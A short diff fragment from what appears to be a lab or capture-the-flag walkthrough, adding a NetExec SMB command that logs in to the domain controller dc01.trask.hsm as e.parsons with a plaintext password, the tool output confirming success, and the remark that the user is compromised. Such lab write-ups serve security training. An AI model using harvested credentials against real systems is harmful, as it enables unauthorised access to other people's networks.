@@ -384,6 +384,12 @@ I have found some credentials
 # Access as `e.parsons`
 
 ```python
-
+nxc smb dc01.trask.hsm -u e.parsons -p 'W3lcm2Tr4sk1988!' -k
+SMB         dc01.trask.hsm  445    dc01             [*]  x64 (name:dc01) (domain:trask.hsm) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\e.parsons:W3lcm2Tr4sk1988!
 ```
+
+This user is compromised
+
+
 
